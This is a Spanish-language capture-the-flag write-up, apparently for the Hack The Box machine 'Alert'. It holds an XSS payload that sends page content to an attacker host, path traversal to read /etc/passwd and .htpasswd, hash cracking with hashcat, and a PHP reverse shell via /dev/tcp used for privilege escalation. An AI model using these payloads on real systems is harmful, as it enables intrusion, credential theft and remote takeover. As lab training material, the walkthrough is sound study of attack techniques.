# Alert
```
sudo nmap -sS -p- -vvv -Pn -n --min-rate 5000 MACHINE_IP
```

Se descubre el puerto 22 y 80. El puerto 80 aloja una página cuyo dominio debemos registrar en /etc/hosts.

Primero podemos hacer fuzzing de directorios sobre la web y de subdominios, encontramos un subdominio llamado statistics.alert.htb.

Visitando este subdominio, se requiere de autenticación que se resiste a pruebas básicas.

En la web vemos que podemos subir archivos de markdown, probamos a subir otras extensiones y no se puede.
Investigando veo que se puede ejecutar xss en markdown, es decir colar js con etiquetas script de html.

## Explotación del XSS en markdown
probamos el siguiente archivo en markdown
```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php', false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://IP_ATACANTE:8080/?content=' + btoa(req.responseText),
true);
req2.send();
```
Esto debe mandar el contenido del archivo messages.php al servidor del atacante.
Enviamos el md y le damos a compartir.
Si el admin que está detrás visita los enlaces que la gente le manda en el apartado de contacto podría funcionar el ataque.
Es el caso así que vemos en el lado del servidor el base64 del contenido del archivo messages.php

al decodearlo vemos lo siguiente:
```php
<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-
34.txt'>2024-03-10_15-48-34.txt</a></li></ul>␍
```

Vemos que messages.php tiene la opción de incluir ficheros de la máquina, podemos probar a modificar el archivo md para provar a apuntar en vez de solamente 
messages.php probar a apuntar a messages.php?file=../../../../../../etc/passwd
y en efecto funciona.

Al parecer hay un archivo de configuración de apache llamado el Apache virtual host configuration file que está localizado en /etc/apache2/sites-available/000-default.conf 
así que aprovechandonos de que podemos ver archivos internos vamos a visualizar el contenido de este archivo y ver que no depara.

En el interior de este archivo de configuración, vemos la ruta bajo el nombre de AuthUserFile /var/www/statistics.alert.htb/.htpasswd que tiene muy buena pinta

Aprovechando la misma vulnerabilidad de ver ficheros internos apuntamos ahora a este para descubrir que estan las credenciales del usuario albert y un hash de tipo MD5 de su 
contraseña.

guardamos el hash en un fichero y craqueamos con hashcat y rockyou.txt 
```bash
hashcat -a 0 -m 1600 hash_file /usr/share/wordlists/rockyou.txt
```
la contraseña es manchesterunted.
Verificamos que podemos entrar a la web administrativa del subdominio y probamos las credenciales en el ssh y entramos.
en /home/albert se encuentra la flag user.txt

## Escalada de privilegios
Moviendonos a /var/www/ vemos que el usario albert sólo tiene acceso a la carpeta alert.htb y no a statistics.alert.htb, pero vemos que si podemos escribir en directorios
de propiedad del usuario www-data que si que tiene acceso a statistics.alert.htb así que instalamos un shell.php y apuntamos a él desde la web para obtener acceso como www-data
```php
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.16.52/4444 0>&1'")
?>
```

Una vez como www-data revisamos el subdominio pero no hay nada de valor.

Vemos la lista de procesos en modo jerarquico con el comando en busca de procesos de root que podamos echar un ojo
```bash
ps -ef --forest
```

aqui se puede ver algunas cosas como tareas CRON de root pero nos llama la atención bajo root algo que está ocurriendo en el puerto 8080.
Investigamos esto con lo siguiente:
```bash
ps -ef | grep 8080
```

Con esto averiguamos en el output que lo que está ocurriendo se encuentra en la ruta /opt/website-monitor.
Toda la estructura de directorios de este proyecto web es propiedad de root, y como el usuario albert podmos acceder a ello así que podemos buscar la manera de instalar
una shell, con el siguiente comando para ver si tenemos escritura en algún sitio:
```bash
find . -writable
```
Y en efecto, tenemos escritura en el direcotrio config entre otros,
colamos una reverse shell llamada shell.php en /opt/website-monitor/config/shell.php para poder apuntar a ella desde la web.

Ahora solo queda poder ver la web desde nuestra máquina de atacante y para ello necesitamos forwardear el puerto 8080 de albert hacia nuestra máquina, para ello,
ejecutamos lo siguiente:
```bash
ssh albert@alert.htb -L 8080:IP_ATACANTE:8080
```

Una vez aqui nos ponemos el listener
```bash
nc -nlvp 4444
```
y accedemos en la url al endpoint creado en http://localhost:8080/config/shell.php

AND WE ARE INSIDE!!!
Sólo falta encontrar el root.txt que se halla en el directorio /root/root.txt
